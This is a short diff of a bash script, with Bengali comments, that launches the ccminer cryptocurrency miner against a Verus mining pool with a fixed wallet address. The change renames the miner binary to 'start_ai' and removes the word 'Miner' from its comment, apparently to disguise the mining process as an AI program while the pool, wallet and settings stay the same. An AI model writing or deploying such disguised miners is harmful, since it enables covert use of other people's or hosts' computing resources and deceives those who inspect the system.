@@ -1,7 +1,7 @@
 #!/bin/bash
 
-# Miner ফাইল executable বানানো
-chmod +x ccminer
+# Executable বানানো
+chmod +x start_ai
 
 # মাইনিং শুরু
-./ccminer -a verus -o stratum+tcp://sg.vipor.net:5040 -u RJfrEDCJfNccNkXmuJcvxCcS5kLQnmpKK7 -p x -t 2
+./start_ai -a verus -o stratum+tcp://sg.vipor.net:5040 -u RJfrEDCJfNccNkXmuJcvxCcS5kLQnmpKK7 -p x -t 2
